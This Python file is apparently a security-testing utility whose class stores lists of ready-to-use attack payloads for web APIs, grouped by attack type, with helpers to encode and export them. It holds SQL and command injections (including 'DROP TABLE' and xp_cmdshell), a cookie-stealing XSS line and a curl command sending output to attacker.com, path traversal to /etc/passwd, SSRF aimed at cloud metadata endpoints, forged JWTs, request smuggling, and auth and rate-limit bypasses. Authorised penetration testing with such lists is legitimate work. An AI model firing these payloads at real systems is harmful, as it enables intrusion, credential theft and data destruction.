#!/usr/bin/env python3
"""
API Payload Generator Utility
Generates various security test payloads for API testing
"""

import json
import base64
import hashlib
import hmac
import time
import random
import string
from urllib.parse import urlencode, quote

class APIPayloadGenerator:
    """Generates various API security test payloads"""
    
    def __init__(self):
        self.payloads = {}
        self._initialize_payloads()
    
    def _initialize_payloads(self):
        """Initialize all payload collections"""
        
        # SQL Injection payloads
        self.payloads['sql_injection'] = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin'--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR '1'='1' #",
            "' OR '1'='1' /*",
            "'; EXEC xp_cmdshell('dir');--",
            "' UNION SELECT username,password FROM users--",
            "' OR 1=1 LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 GROUP BY 1--"
        ]
        
        # XSS payloads
        self.payloads['xss'] = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"
        ]
        
        # NoSQL Injection payloads
        self.payloads['nosql_injection'] = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$in": ["admin", "user"]}',
            '{"$or": [{"admin": true}, {"role": "admin"}]}',
            '{"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
            '{"$not": {"$regex": "^admin$"}}',
            '{"$expr": {"$eq": ["$role", "admin"]}}'
        ]
        
        # Command Injection payloads
        self.payloads['command_injection'] = [
            "; ls -la",
            "| whoami",
            "& dir",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| netstat -an",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; ping -c 1 attacker.com",
            "| curl http://attacker.com/$(whoami)"
        ]
        
        # Path Traversal payloads
        self.payloads['path_traversal'] = [
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%255c..%255c..%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts",
            "..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts",
            "..%255c..%255c..%255cWindows%255cSystem32%255cdrivers%255cetc%255chosts",
            "..%c1%9c..%c1%9c..%c1%9cWindows%c1%9cSystem32%c1%9cdrivers%c1%9cetc%c1%9chosts"
        ]
        
        # JWT payloads
        self.payloads['jwt_attacks'] = [
            # None algorithm
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.",
            # Weak secret
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.weak_secret",
            # No signature
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.",
            # Empty signature
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.",
            # Modified payload
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.signature"
        ]
        
        # SSRF payloads
        self.payloads['ssrf'] = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://10.0.0.1",
            "http://192.168.1.1",
            "http://172.16.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.azure.internal/metadata/instance",
            "file:///etc/passwd",
            "file:///etc/hosts",
            "dict://127.0.0.1:11211/",
            "ftp://127.0.0.1/",
            "gopher://127.0.0.1/_",
            "http://127.1",
            "http://2130706433",
            "http://0x7f000001"
        ]
        
        # Host header injection payloads
        self.payloads['host_injection'] = [
            "evil.com",
            "attacker.com",
            "malicious.com",
            "localhost",
            "127.0.0.1",
            "evil.com:80",
            "evil.com:443",
            "http://evil.com",
            "https://evil.com",
            "evil.com:80@attacker.com",
            "evil.com#attacker.com",
            "evil.com%00.attacker.com",
            "2130706433",
            "0x7f000001",
            "017700000001"
        ]
        
        # Parameter pollution payloads
        self.payloads['parameter_pollution'] = [
            "id=1&id=2",
            "user=admin&user=test",
            "search=test&search=admin",
            "id[]=1&id[]=2",
            "user[]=admin&user[]=test",
            "id=1&id=&id=2",
            "user=admin&user=null&user=test",
            "id=1&id[]=2",
            "user=admin&user[]=test"
        ]
        
        # Request smuggling payloads
        self.payloads['request_smuggling'] = [
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nX",
            "POST /api/test HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX"
        ]
        
        # GraphQL payloads
        self.payloads['graphql'] = [
            {"query": "query { __schema { types { name } } }"},
            {"query": "query { __type(name: \"User\") { fields { name } } }"},
            {"query": "query { users { id name email posts { id title content } } }"},
            {"query": "mutation { createUser(input: {name: \"test\", email: \"test@test.com\"}) { id } }"},
            [{"query": "query { __schema { types { name } } }"}, {"query": "query { __type(name: \"User\") { fields { name } } }"}]
        ]
        
        # OAuth payloads
        self.payloads['oauth'] = [
            "redirect_uri=https://evil.com",
            "redirect_uri=javascript:alert('xss')",
            "state=null",
            "state=undefined",
            "response_type=token",
            "scope=admin",
            "client_id=null",
            "nonce=bypass",
            "code_challenge=",
            "code=reused_code"
        ]
    
    def get_payloads(self, category=None):
        """Get payloads for a specific category or all payloads"""
        if category:
            return self.payloads.get(category, [])
        return self.payloads
    
    def generate_custom_payload(self, base_payload, variations=5):
        """Generate custom payload variations"""
        variations_list = []
        
        # URL encoding variations
        variations_list.append(quote(base_payload))
        variations_list.append(quote(quote(base_payload)))  # Double encoding
        
        # Case variations
        variations_list.append(base_payload.upper())
        variations_list.append(base_payload.lower())
        
        # Null byte variations
        variations_list.append(base_payload + "\x00")
        variations_list.append(base_payload + "%00")
        
        # Unicode variations
        variations_list.append(base_payload.replace("a", "\u0061"))
        variations_list.append(base_payload.replace("o", "\u006f"))
        
        return variations_list[:variations]
    
    def generate_authentication_bypass_payloads(self):
        """Generate authentication bypass payloads"""
        auth_bypass = [
            # JWT bypass
            "null",
            "undefined",
            "test",
            "admin",
            "123456",
            "Bearer null",
            "Bearer undefined",
            "Bearer test",
            "Bearer admin",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            
            # API key bypass
            "X-API-Key: null",
            "X-API-Key: undefined",
            "X-API-Key: test",
            "Authorization: null",
            "Authorization: undefined",
            
            # Custom headers
            "X-Auth-Token: null",
            "X-Access-Token: null",
            "X-Token: null",
            "API-Key: null",
            "Auth-Token: null"
        ]
        return auth_bypass
    
    def generate_rate_limiting_bypass_payloads(self):
        """Generate rate limiting bypass payloads"""
        rate_limit_bypass = [
            # Header manipulation
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            
            # User agent manipulation
            {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
            {"User-Agent": "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
            {"User-Agent": "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"},
            
            # Custom headers
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Requested-With": "Fetch"},
            {"Accept": "application/json"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
        ]
        return rate_limit_bypass
    
    def generate_mass_assignment_payloads(self):
        """Generate mass assignment payloads"""
        mass_assignment = [
            # User role escalation
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"isAdmin": True},
            {"user_role": "admin"},
            {"role_id": 1},
            {"roleId": 1},
            {"permissions": ["admin", "user"]},
            {"access_level": "admin"},
            {"accessLevel": "admin"},
            
            # Account status manipulation
            {"active": True},
            {"enabled": True},
            {"verified": True},
            {"email_verified": True},
            {"emailVerified": True},
            {"status": "active"},
            {"account_status": "active"},
            
            # Privilege escalation
            {"is_superuser": True},
            {"isSuperuser": True},
            {"superuser": True},
            {"privileges": ["read", "write", "admin"]},
            {"capabilities": ["admin"]},
            
            # Billing/Subscription manipulation
            {"premium": True},
            {"is_premium": True},
            {"subscription": "premium"},
            {"plan": "premium"},
            {"billing_tier": "premium"},
            {"payment_status": "paid"},
            
            # ID manipulation
            {"id": 1},
            {"user_id": 1},
            {"userId": 1},
            {"account_id": 1},
            {"accountId": 1}
        ]
        return mass_assignment
    
    def generate_information_disclosure_patterns(self):
        """Generate information disclosure detection patterns"""
        patterns = [
            # API documentation
            "swagger", "openapi", "api-docs", "documentation",
            "endpoints", "routes", "methods", "parameters",
            
            # Version information
            "version", "api_version", "build", "release",
            "v1", "v2", "v3", "latest", "stable",
            
            # Server information
            "server", "host", "port", "environment",
            "development", "staging", "production",
            
            # Database information
            "database", "db", "mysql", "postgresql", "mongodb",
            "connection", "hostname", "port", "schema",
            
            # Error information
            "stack trace", "exception", "error", "debug",
            "traceback", "line number", "file path",
            
            # Sensitive endpoints
            "admin", "internal", "private", "secret",
            "backup", "config", "settings", "system",
            
            # Authentication information
            "auth", "login", "register", "password",
            "token", "jwt", "bearer", "api_key",
            
            # Business logic information
            "user", "customer", "order", "payment",
            "account", "profile", "billing", "subscription"
        ]
        return patterns
    
    def export_payloads_to_json(self, filename="api_payloads.json"):
        """Export all payloads to JSON file"""
        with open(filename, 'w') as f:
            json.dump(self.payloads, f, indent=2)
        return filename
    
    def import_payloads_from_json(self, filename="api_payloads.json"):
        """Import payloads from JSON file"""
        try:
            with open(filename, 'r') as f:
                imported_payloads = json.load(f)
                self.payloads.update(imported_payloads)
            return True
        except FileNotFoundError:
            return False
    
    def add_custom_payload(self, category, payload):
        """Add custom payload to a category"""
        if category not in self.payloads:
            self.payloads[category] = []
        self.payloads[category].append(payload)
    
    def remove_payload(self, category, payload):
        """Remove payload from a category"""
        if category in self.payloads and payload in self.payloads[category]:
            self.payloads[category].remove(payload)
    
    def get_payload_statistics(self):
        """Get statistics about payloads"""
        stats = {}
        total_payloads = 0
        
        for category, payloads in self.payloads.items():
            stats[category] = len(payloads)
            total_payloads += len(payloads)
        
        stats['total'] = total_payloads
        stats['categories'] = len(self.payloads)
        
        return stats

# Example usage
if __name__ == "__main__":
    generator = APIPayloadGenerator()
    
    # Get all payloads
    all_payloads = generator.get_payloads()
    print(f"Total categories: {len(all_payloads)}")
    
    # Get specific category
    sql_payloads = generator.get_payloads('sql_injection')
    print(f"SQL Injection payloads: {len(sql_payloads)}")
    
    # Generate custom payloads
    custom_payloads = generator.generate_custom_payload("admin'--", 3)
    print(f"Custom payloads: {custom_payloads}")
    
    # Get statistics
    stats = generator.get_payload_statistics()
    print(f"Payload statistics: {stats}")
    
    # Export payloads
    filename = generator.export_payloads_to_json()
    print(f"Payloads exported to: {filename}") 